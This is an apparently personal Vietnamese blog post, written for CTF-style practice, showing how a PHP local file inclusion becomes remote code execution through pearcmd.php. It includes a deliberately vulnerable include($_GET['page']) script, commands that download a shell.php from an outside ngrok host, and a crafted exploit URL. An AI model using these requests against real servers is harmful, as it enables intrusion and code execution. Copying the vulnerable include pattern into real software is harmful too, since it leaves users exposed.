<!DOCTYPE html>
<html lang="en">
    <head>
  <!-- 元数据 -->
  <meta charset="utf-8">
  <link rel="canonical" href="https://rayinaw.github.io/2023/08/03/lfi-to-rce-via-pearcmd-or-peclcmd/">
  <link rel="icon" href="https://i.pinimg.com/564x/07/87/e7/0787e75ed249720cdb85f6918c609f61.jpg">
  
  <title>lfi-to-rce-via-pearcmd-or-peclcmd | Rayinaw</title>
  <meta name="author" content="Rayinaw">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="robots" content="index,follow">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="format-detection" content="telphone=no, email=no">
  
    <meta name="keywords" content="LFI, PHP">
  
  <meta name="description" content="LFI To RCE via pearcmd or peclcmdYêu cầu Tồn tại lỗ hổng LFI (Local File Inclusion). Mode register_argc_argv phải được bật.  Mình sẽ nói rõ hơn ở dưới. Set up môi trườngCài đặt bản apache trong docker">
<meta property="og:type" content="article">
<meta property="og:title" content="lfi-to-rce-via-pearcmd-or-peclcmd">
<meta property="og:url" content="https://rayinaw.github.io/2023/08/03/lfi-to-rce-via-pearcmd-or-peclcmd/index.html">
<meta property="og:site_name" content="Rayinaw">
<meta property="og:description" content="LFI To RCE via pearcmd or peclcmdYêu cầu Tồn tại lỗ hổng LFI (Local File Inclusion). Mode register_argc_argv phải được bật.  Mình sẽ nói rõ hơn ở dưới. Set up môi trườngCài đặt bản apache trong docker">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.pinimg.com/564x/07/87/e7/0787e75ed249720cdb85f6918c609f61.jpg">
<meta property="article:published_time" content="2023-08-03T08:04:41.000Z">
<meta property="article:modified_time" content="2023-08-04T18:22:36.751Z">
<meta property="article:author" content="Rayinaw">
<meta property="article:tag" content="PHP">
<meta property="article:tag" content="LFI">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.pinimg.com/564x/07/87/e7/0787e75ed249720cdb85f6918c609f61.jpg">
  
  <!-- 站点验证相关 -->
  
    
      <meta name="google-site-verification" content="aI3yWWy1IiiYpszN7ZglYDMHV2_A2mRNPujhnK6q8uA">
    
    
    
  
  <!-- 样式表文件 -->
  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" media="all">
  
    <link rel="stylesheet" id="darkmode-css" href="/css/kr-color-dark.min.css" media="(prefers-color-scheme: dark)">
    <script src="/js/kr-dark.min.js"></script>
  
  
    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night.min.css" media="all">
  
  
  <link rel="stylesheet" id="fontawe-css" href="/vendors/font-awesome@4.7.0/css/font-awesome.min.css" media="all">
  <link rel="stylesheet" id="nprogress-css" href="/vendors/nprogress@0.2.0/nprogress.css" media="all">
  
  
    <link rel="stylesheet" href="/vendors/aplayer@1.10.1/dist/APlayer.min.css">
  
  
    <link rel="stylesheet" href="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
  
  <!-- 不得不预先加载的一些JS文件 -->
  <script src="/vendors/jquery@3.6.0/dist/jquery.min.js"></script>
  
    <script src="/vendors/qrcode_js@1.0.0/qrcode.min.js"></script>
  
  
  <style>
    
      .kratos-cover.kratos-cover-2 {
        background-image: url('/images/banner.webp');
      }
    
    
      @media(min-width:768px) {
        body.custom-background {
          background-image: url('/images/bg.webp');
        }
      }
    
  </style>
  
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/rss2.xml" title="Rayinaw" type="application/rss+xml">
</head>


    <body class="custom-background">
        <div id="kratos-wrapper">
    <div id="kratos-page">
        <div id="kratos-header">
            <header id="kratos-desktop-topnav" class="kratos-topnav">
                <div class="container">
                    <div class="nav-header">
                        <nav id="kratos-menu-wrap">
                            <ul id="kratos-primary-menu" class="sf-menu">
                                
                                                
                                                    
                                                        
                                                                <li>
                                                                    <a href="/">
                                                                        <i class="fa fa-home"></i>Trang chủ
                                                                    </a>
                                                                </li>
                                                                
                                                                    
                                                        
                                                                <li>
                                                                    <a href="/archives/">
                                                                        <i class="fa fa-book"></i>Kho lưu trữ
                                                                    </a>
                                                                </li>
                                                                
                                                                    
                                                        
                                                                <li>
                                                                    <a href="/about/">
                                                                        <i class="fa fa-paper-plane"></i>Về mình
                                                                    </a>
                                                                </li>
                                                                
                                                                    
                                                                        
                            </ul>
                        </nav>
                    </div>
                </div>
            </header>
            <header id="kratos-mobile-topnav" class="kratos-topnav">
                <div class="container">
                    <div class="color-logo">
                        <a href="/">
                            Rayinaw
                        </a>
                    </div>
                    <div class="nav-toggle">
                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
                            <i></i>
                        </a>
                    </div>
                </div>
            </header>
        </div>
        <div class="kratos-start kratos-hero-2">
            <!-- <div class="kratos-overlay"></div> -->
            <div class="kratos-cover kratos-cover-2 text-center">
                <div class="desc desc2 animate-box">
                    <a href="/">
                        <h2>
                            Rayinaw
                        </h2> <br>
                        <span>Nơi mình ghi chú lại những thứ đã học.</span>
                    </a>
                </div>
            </div>
        </div>

        <div id="kratos-blog-post">
            <div class="container">
                <div id="main" class="row">
                    

        

            <section class="col-md-8">

        

            <article itemscope itemtype="https://schema.org/Article">
    
    <link itemprop="mainEntityOfPage" href="https://rayinaw.github.io/2023/08/03/lfi-to-rce-via-pearcmd-or-peclcmd/">
    <div class="kratos-hentry kratos-post-inner clearfix">
        <header class="kratos-entry-header">
            
                <h1 class="kratos-entry-title text-center" itemprop="name headline">lfi-to-rce-via-pearcmd-or-peclcmd</h1>
            
            
            <ul class="kratos-post-meta text-center">
                <li><time datetime="2023-08-03T08:04:41.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2023-08-03</time></li>
                <li itemprop="author" itemscope itemtype="https://schema.org/Person">
                    <i class="fa fa-user"></i> Tác giả <span itemprop="name">Rayinaw</span>
                </li>
                <li>
                    <i class="fa fa-edit"></i> 
                    
                    
                        ~9.04K
                    
                    từ
                </li>
                
            </ul>
        </header>
        <div class="kratos-post-content">
            
            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                <div class="icon"><i class="fa fa-warning"></i></div>
                <div class="text"><p>Bài viết này được chỉnh sửa lần cuối vào <time datetime="1691173356751"></time> trước, và có thể cần cập nhật。</p></div>
            </div>
            
            
            
            <hr>
            <div itemprop="articleBody"><h1 id="LFI-To-RCE-via-pearcmd-or-peclcmd"><a href="#LFI-To-RCE-via-pearcmd-or-peclcmd" class="headerlink" title="LFI To RCE via pearcmd or peclcmd"></a>LFI To RCE via pearcmd or peclcmd</h1><h2 id="Yeu-cau"><a href="#Yeu-cau" class="headerlink" title="Yêu cầu"></a>Yêu cầu</h2><ul>
<li>Tồn tại lỗ hổng LFI (Local File Inclusion).</li>
<li>Mode <code>register_argc_argv</code> phải được bật.</li>
</ul>
<p>Mình sẽ nói rõ hơn ở dưới.</p>
<h2 id="Set-up-moi-truong"><a href="#Set-up-moi-truong" class="headerlink" title="Set up môi trường"></a>Set up môi trường</h2><p>Cài đặt bản apache trong docker:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker pull php:apache</span><br><span class="line"><span class="comment"># Hoặc lấy cùng phiên bản với bài viết</span></span><br><span class="line">docker pull php:<span class="number">8.2</span>.<span class="number">8</span>-apache</span><br></pre></td></tr></table></figure>

<p>Version hiện tại trong thời điểm bài viết này là 8.2.8. Bản apache thường được sử dụng trong các bài ctf do đó mình cũng sử dụng bản này để testing.</p>
<p>Cho tới thời điểm hiện tại, mode <code>register_argc_argv</code> trong các images php:apache đều được bật:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">rayinaw@ctf:~$ docker images</span><br><span class="line">REPOSITORY   TAG       IMAGE ID       CREATED      SIZE</span><br><span class="line">php          apache    8bb6f2dcced5   5 days ago   503MB</span><br><span class="line">rayinaw@ctf:~$ docker run php:apache</span><br><span class="line">rayinaw@ctf:~$ docker ps</span><br><span class="line">CONTAINER ID   IMAGE          COMMAND                  CREATED          STATUS          PORTS     NAMES</span><br><span class="line">2bfaf5fad419   php:apache     <span class="string">&quot;docker-php-entrypoi…&quot;</span>   16 seconds ago   Up 15 seconds   80/tcp    quirky_perlman</span><br><span class="line">rayinaw@ctf:~$ docker <span class="built_in">exec</span> -it 2bfaf5fad419 /bin/bash</span><br><span class="line">root@2bfaf5fad419:~<span class="comment"># php -i | grep register_argc_argv</span></span><br><span class="line">register_argc_argv =&gt; On =&gt; On</span><br></pre></td></tr></table></figure>

<p>Do đó chỉ cần tồn tại lỗ hổng LFI và server không tự tắt đi mode đó thì ta có thể lợi dụng đến pearcmd hoặc peclcmd để RCE.</p>
<h2 id="Mot-so-kien-thuc-can-nam"><a href="#Mot-so-kien-thuc-can-nam" class="headerlink" title="Một số kiến thức cần nắm"></a>Một số kiến thức cần nắm</h2><h3 id="Pearcmd-va-Peclcmd"><a href="#Pearcmd-va-Peclcmd" class="headerlink" title="Pearcmd và Peclcmd"></a>Pearcmd và Peclcmd</h3><p><code>pearcmd</code> (PHP Extension and Application Repository) và <code>peclcmd</code> (PHP Extension Community Library) là hai công cụ dùng để quản lý gói trong php.</p>
<p>Hai công cụ này có các thao tác tương tự nhau, và được tích hợp sẵn trong các images php:apache.</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root@2bfaf5fad419:~<span class="comment"># pecl</span></span><br><span class="line">Commands:</span><br><span class="line">build                  Build an Extension From C Source</span><br><span class="line">bundle                 Unpacks a Pecl Package</span><br><span class="line">channel-add            Add a Channel</span><br><span class="line">channel-alias          Specify an <span class="built_in">alias</span> to a channel name</span><br><span class="line">channel-delete         Remove a Channel From the List</span><br><span class="line">channel-discover       Initialize a Channel from its server</span><br><span class="line">channel-info           Retrieve Information on a Channel</span><br><span class="line">channel-login          Connects and authenticates to remote channel server</span><br><span class="line">channel-logout         Logs out from the remote channel server</span><br><span class="line">channel-update         Update an Existing Channel</span><br><span class="line">..........</span><br><span class="line"><span class="comment">##################</span></span><br><span class="line"><span class="comment">##################</span></span><br><span class="line">root@2bfaf5fad419:~<span class="comment"># pear</span></span><br><span class="line">Commands:</span><br><span class="line">build                  Build an Extension From C Source</span><br><span class="line">bundle                 Unpacks a Pecl Package</span><br><span class="line">channel-add            Add a Channel</span><br><span class="line">channel-alias          Specify an <span class="built_in">alias</span> to a channel name</span><br><span class="line">channel-delete         Remove a Channel From the List</span><br><span class="line">channel-discover       Initialize a Channel from its server</span><br><span class="line">channel-info           Retrieve Information on a Channel</span><br><span class="line">channel-login          Connects and authenticates to remote channel server</span><br><span class="line">..............</span><br></pre></td></tr></table></figure>

<p><code>pecl</code> và <code>pear</code> gần như tương tự nhau nên từ bây giờ mình chỉ trình bày một cái trong mỗi câu lệnh nhé.</p>
<h3 id="Install-package"><a href="#Install-package" class="headerlink" title="Install package"></a>Install package</h3><p><code>pear install -r /&lt;folder&gt; &lt;url&gt;</code>: câu lệnh này dùng để install package tuy nhiên nó sẽ lưu file tải về trong thư mục chỉ định và không xóa sau khi thực thi.</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@5de8c0a778ef:~<span class="comment"># pear install -r /tmp https://262f-14-191-237-53.ngrok-free.app/index.php</span></span><br><span class="line">downloading shell.php ...</span><br><span class="line">Starting to download shell.php (Unknown size)</span><br><span class="line">....<span class="keyword">done</span>: 53 bytes</span><br><span class="line">Could not get contents of package <span class="string">&quot;/tmp/pear/download/shell.php&quot;</span>. Invalid tgz file.</span><br><span class="line">Download of <span class="string">&quot;https://262f-14-191-237-53.ngrok-free.app/index.php&quot;</span> succeeded, but it is not a valid package archive</span><br><span class="line">Invalid or missing remote package file</span><br><span class="line">install failed</span><br></pre></td></tr></table></figure>
<p>Tuy có lỗi nhưng bây giờ file cũng đã được lưu trong <code>/tmp/pear/download/</code></p>
<h3 id="Download-package"><a href="#Download-package" class="headerlink" title="Download package"></a>Download package</h3><p><code>pear download &lt;url&gt;</code>: câu lệnh sẽ lưu file ở trong <code>/root</code></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@5de8c0a778ef:~<span class="comment"># pear download  https://262f-14-191-237-53.ngrok-free.app/index.php</span></span><br><span class="line">downloading shell.php ...</span><br><span class="line">Starting to download shell.php (Unknown size)</span><br><span class="line">....<span class="keyword">done</span>: 53 bytes</span><br><span class="line">Could not get contents of package <span class="string">&quot;/root/shell.php&quot;</span>. Invalid tgz file.</span><br><span class="line">Download of <span class="string">&quot;https://262f-14-191-237-53.ngrok-free.app/index.php&quot;</span> succeeded, but it is not a valid package archive</span><br><span class="line">Invalid or missing remote package file</span><br><span class="line">download failed</span><br></pre></td></tr></table></figure>

<h3 id="Set-bien-config-va-luu-vao-file"><a href="#Set-bien-config-va-luu-vao-file" class="headerlink" title="Set biến config và lưu vào file"></a>Set biến config và lưu vào file</h3><p>Câu lệnh này mình test với pecl không được, chỉ có pear được.</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@5de8c0a778ef:~<span class="comment"># pear help options</span></span><br><span class="line">Options:</span><br><span class="line">     -v         increase verbosity level (default 1)</span><br><span class="line">     -q         be quiet, decrease verbosity level</span><br><span class="line">     -c file    find user configuration <span class="keyword">in</span> `file<span class="string">&#x27;</span></span><br><span class="line"><span class="string">     -C file    find system configuration in `file&#x27;</span></span><br><span class="line">     -d foo=bar <span class="built_in">set</span> user config variable `foo<span class="string">&#x27; to `bar&#x27;</span></span><br><span class="line">     -D foo=bar <span class="built_in">set</span> system config variable `foo<span class="string">&#x27; to `bar&#x27;</span></span><br><span class="line">     -G         start <span class="keyword">in</span> graphical (Gtk) mode</span><br><span class="line">     -s         store user configuration</span><br><span class="line">     -S         store system configuration</span><br><span class="line">     -u foo     <span class="built_in">unset</span> `foo<span class="string">&#x27; in the user configuration</span></span><br><span class="line"><span class="string">     -h, -?     display help/usage (this message)</span></span><br><span class="line"><span class="string">     -V         version information</span></span><br></pre></td></tr></table></figure>

<p>Câu lệnh: <code>pear -c /tmp/test.php -d cache_dir=heheeh -s</code></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@5de8c0a778ef:~<span class="comment"># pear -c /tmp/test.php -d man_dir=heheeh -s</span></span><br><span class="line">root@5de8c0a778ef:~<span class="comment"># cat /tmp/test.php </span></span><br><span class="line"><span class="comment">#PEAR_Config 0.9</span></span><br><span class="line">a:2:&#123;s:10:<span class="string">&quot;__channels&quot;</span>;a:2:&#123;s:12:<span class="string">&quot;pecl.php.net&quot;</span>;a:0:&#123;&#125;s:5:<span class="string">&quot;__uri&quot;</span>;a:0:&#123;&#125;&#125;s:7:<span class="string">&quot;man_dir&quot;</span>;s:6:<span class="string">&quot;heheeh&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>Câu lệnh này set những biến config có sẵn như man_dir, auto_discover, data_dir, php_dir, cache_dir, temp_dir, download_dir, bin_dir,…</p>
<h3 id="Nguyen-ly-hoat-dong-cua-ham-include"><a href="#Nguyen-ly-hoat-dong-cua-ham-include" class="headerlink" title="Nguyên lý hoạt động của hàm include"></a>Nguyên lý hoạt động của hàm include</h3><p>Khi ta gọi hàm include, PHP sẽ đọc và thực thi nội dung của tệp được chỉ định. Nếu trong tệp include vào có mã PHP, mã đó cũng sẽ được thực thi tại thời điểm gọi hàm include.</p>
<p>Nội dung của tệp được thực thi xong sẽ được nhúng (embed) vào chính tại điểm mà hàm include được gọi trong mã nguồn.</p>
<p>Nó sẽ tương ứng như việc ta compile file <code>php abc.php</code> rồi chèn kết quả vào.</p>
<p>Đến đây mình có câu hỏi cho bạn rằng nếu file <code>abc.php</code> yêu cầu argv thì nó sẽ được truyền như thế nào?</p>
<p>Nó sẽ sử dụng biến $_SERVER[‘argv’] như dưới đây.</p>
<h4 id="Bien-SERVER-‘argv’"><a href="#Bien-SERVER-‘argv’" class="headerlink" title="Biến $_SERVER[‘argv’]"></a>Biến $_SERVER[‘argv’]</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">rayinaw@ctf:~/test$ cat abc.php </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">rayinaw@ctf:~/test$ php abc.php arg1 arg2 arg3</span><br><span class="line"><span class="keyword">array</span>(<span class="number">4</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;abc.php&quot;</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;arg1&quot;</span></span><br><span class="line">  [<span class="number">2</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;arg2&quot;</span></span><br><span class="line">  [<span class="number">3</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;arg3&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>$_SERVER[‘argv’] là một mảng các giá trị với $_SERVER[‘argv’][0] là file name, và còn lại là các args.</p>
<p>Và đây là đoạn lệnh lấy argv ở trong <code>pearcmd.php</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$argv</span>) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$HTTP_SERVER_VARS</span>[<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;ERROR: either use the CLI php executable, or set register_argc_argv=On in php.ini&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">php_sapi_name</span>() != <span class="string">&#x27;cli&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>]) &amp;&amp; <span class="variable">$argv</span>[<span class="number">1</span>] == <span class="string">&#x27;--&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="variable">$argv</span> = <span class="title function_ invoke__">array_values</span>(<span class="variable">$argv</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Them-tham-so-vao-file-duoc-include"><a href="#Them-tham-so-vao-file-duoc-include" class="headerlink" title="Thêm tham số vào file được include"></a>Thêm tham số vào file được include</h4><p>Khi mode <code>register_argc_argv</code> được bật, ta có thể truyền vào <code>$_SERVER[&#39;argv&#39;]</code> thông qua phần parameters của url.</p>
<p>Ở phần parameters của url (sau đấu <code>?</code>), <code>$_SERVER[&#39;argv&#39;]</code> sẽ chia các argv bằng dấu khoảng trắng, <code>$_GET[]</code> sẽ chia các parameters bằng dấu <code>&amp;</code>.</p>
<p>Khi file include vào cần tham số, ta có thể truyền vào biến <code>$_SERVER[&#39;argv&#39;]</code>. Với giá trị <code>$_SERVER[&#39;argv&#39;][0]</code> là bất kỳ, còn các args sau sẽ là argv cho file.</p>
<h2 id="Di-sau-vao-cach-khai-thac"><a href="#Di-sau-vao-cach-khai-thac" class="headerlink" title="Đi sâu vào cách khai thác"></a>Đi sâu vào cách khai thác</h2><p>Để cho dễ hình dung, mình sẽ viết một chương trình đơn giản, các bạn có thể down về build ở <a href>đây</a>.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /?page=/var/www/html/lolhaha&#x27;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">		<span class="keyword">die</span>();</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="pear-install-or-pecl-install"><a href="#pear-install-or-pecl-install" class="headerlink" title="pear install or pecl install"></a>pear install or pecl install</h3><h3 id="pear-set-config"><a href="#pear-set-config" class="headerlink" title="pear set config"></a>pear set config</h3><p><code>pear -c /tmp/test.php -d man_dir=malicious_messages -s</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#PEAR_Config 0.9</span><br><span class="line">a:2:&#123;s:10:&quot;__channels&quot;;a:2:&#123;s:12:&quot;pecl.php.net&quot;;a:0:&#123;&#125;s:5:&quot;__uri&quot;;a:0:&#123;&#125;&#125;s:7:&quot;man_dir&quot;;s:18:&quot;malicious_messages&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>Khi sử dụng câu lệnh set config, file test.php sẽ có nội dung như trên. Có hai vấn đề ta gặp phải khi include nó để rce:</p>
<ul>
<li>Khi viết vào file, nội dung của malicious_messages bị encode, do đó nội dung ghi vào sẽ kiểu như <code>%3C?phpinfo();?%3E</code>. Việc này mình nghĩ là sẽ có cách để không bị encode nhưng mà mình chưa biết và cũng lười tìm hiểu vì có cách khác rùi.</li>
<li>Sau khi tạo ra file đó, ta cần include file chứa mã php và điều kiện để include không gặp lỗi là tag <code>&lt;?php</code> phải nằm ở đầu file. Do đó ta cần bỏ đi đoạn đầu này:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#PEAR_Config 0.9</span><br><span class="line">a:2:&#123;s:10:&quot;__channels&quot;;a:2:&#123;s:12:&quot;pecl.php.net&quot;;a:0:&#123;&#125;s:5:&quot;__uri&quot;;a:0:&#123;&#125;&#125;s:7:&quot;man_dir&quot;;s:18:&quot;</span><br></pre></td></tr></table></figure></li>
</ul>
<blockquote>
<p>Warning<br>This feature has been DEPRECATED as of PHP 7.3.0. Relying on this feature is highly discouraged.</p>
</blockquote>
<p>Trên <a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.php.net/manual/en/filters.string.php">https://www.php.net/manual/en/filters.string.php</a> có nói là string.strip_tags bị DEPRECATED từ 7.3.0 do đó cách làm của mình chỉ được với phiên bản dưới 7.3.0</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.83.130:5000/?page=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/test.php+-d+man_dir=PnxMb5eIl0CFpYGTTVttx8XjSvFaXV5vbmFhgYGB+-s</span><br></pre></td></tr></table></figure></div>
        </div>
        
        <footer class="kratos-entry-footer clearfix">
            
                <div class="post-like-donate text-center clearfix" id="post-like-donate">
                
                
                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> Chia sẻ</a>
                    <div class="share-wrap" style="display: none;">
    <div class="share-group">
        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-qq"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-star"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-weixin"></i>
            </div>
            <div class="share-int">
                <div class="qrcode" id="wechat-qr"></div>
                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
            </div>
        </a>
        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-weibo"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-facebook"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-twitter"></i>
            </div>
        </a>
    </div>
    <script type="text/javascript">
        $(()=>{
            new QRCode("wechat-qr", {
                text: "https://rayinaw.github.io/2023/08/03/lfi-to-rce-via-pearcmd-or-peclcmd/",
                width: 150,
                height: 150,
                correctLevel : QRCode.CorrectLevel.H
            });
        });
        function share(dest) {
            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
            const weiboBase     = "https://service.weibo.com/share/share.php?";
            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
            const twitterBase   = "https://twitter.com/intent/tweet?";
            const hostUrl       = "https://rayinaw.github.io/2023/08/03/lfi-to-rce-via-pearcmd-or-peclcmd/";
            const title         = "「lfi-to-rce-via-pearcmd-or-peclcmd」";
            const excerpt       = `LFI To RCE via pearcmd or peclcmdYêu cầu
Tồn tại lỗ hổng LFI (Local File Inclusion).
Mode register_argc_argv phải đượ...`;
            let _URL;
            switch (dest) {
                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
            }
            window.open(_URL);
        };
    </script>
</div>
                
                </div>
            
            <div class="footer-tag clearfix">
                <div class="pull-left">
                <i class="fa fa-tags"></i>
                    <a class="tag-none-link" href="/tags/LFI/" rel="tag">LFI</a>, <a class="tag-none-link" href="/tags/PHP/" rel="tag">PHP</a>
                </div>
                <div class="pull-date">
                    <time datetime="2023-08-04T18:22:36.751Z" itemprop="dateModified">Lần chỉnh sửa cuối cùng：2023-08-05</time>
                </div>
            </div>
        </footer>
    </div>
    
        <nav class="navigation post-navigation clearfix" role="navigation">
            
            <div class="nav-previous clearfix">
                <a title=" gobuffalo-soda-cli" href="/2023/07/17/gobuffalo-soda-cli/">&lt; Bài đăng cũ hơn</a>
            </div>
            
            
        </nav>
    
    
</article>

        

            </section>

        

                
            

<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
    
    
                <aside id="krw-about" class="widget widget-kratos-about clearfix">
